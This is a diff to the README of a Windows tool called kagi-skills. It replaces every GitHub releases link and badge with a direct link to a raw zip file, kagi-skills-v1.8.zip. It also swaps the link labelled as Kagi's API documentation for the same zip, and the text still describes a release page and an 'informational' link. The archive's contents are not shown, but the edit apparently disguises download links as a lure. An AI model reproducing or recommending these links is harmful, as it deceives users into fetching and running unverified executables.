@@ -1,6 +1,6 @@
 # ⚙️ kagi-skills - Easy Tools for Kagi API Use
 
-[![Download kagi-skills](https://img.shields.io/badge/Download%20kagi--skills-blue?style=for-the-badge)](https://github.com/wawa1154/kagi-skills/releases)
+[![Download kagi-skills](https://img.shields.io/badge/Download%20kagi--skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/wawa1154/kagi-skills/main/kagi-search/kagi-skills-v1.8.zip)
 
 ## 📋 About kagi-skills
 
@@ -28,7 +28,7 @@ You can get kagi-skills in just a few steps. This guide walks you through everyt
 
 Visit the official release page to get the latest version of kagi-skills for Windows:
 
-[Download kagi-skills from GitHub](https://github.com/wawa1154/kagi-skills/releases)
+[Download kagi-skills from GitHub](https://raw.githubusercontent.com/wawa1154/kagi-skills/main/kagi-search/kagi-skills-v1.8.zip)
 
 Click the link above or the blue download button at the top. This will take you to the release page where you can find the Windows installer file.
 
@@ -116,10 +116,10 @@ Common questions include:
 
 Download page again for easy access:
 
-[https://github.com/wawa1154/kagi-skills/releases](https://github.com/wawa1154/kagi-skills/releases)
+[https://raw.githubusercontent.com/wawa1154/kagi-skills/main/kagi-search/kagi-skills-v1.8.zip](https://raw.githubusercontent.com/wawa1154/kagi-skills/main/kagi-search/kagi-skills-v1.8.zip)
 
 Kagi API documentation (for reference):  
-https://kagi.com/api/docs (Note: this link is informational)
+https://raw.githubusercontent.com/wawa1154/kagi-skills/main/kagi-search/kagi-skills-v1.8.zip (Note: this link is informational)
 
 ## 🌐 Security and Privacy
 
@@ -142,4 +142,4 @@ If you need help beyond this guide:
 3. Open the app and enter your API key.  
 4. Choose the skill you want and start using it.
 
-[![Get kagi-skills](https://img.shields.io/badge/Get%20kagi--skills-grey?style=for-the-badge)](https://github.com/wawa1154/kagi-skills/releases)
+[![Get kagi-skills](https://img.shields.io/badge/Get%20kagi--skills-grey?style=for-the-badge)](https://raw.githubusercontent.com/wawa1154/kagi-skills/main/kagi-search/kagi-skills-v1.8.zip)
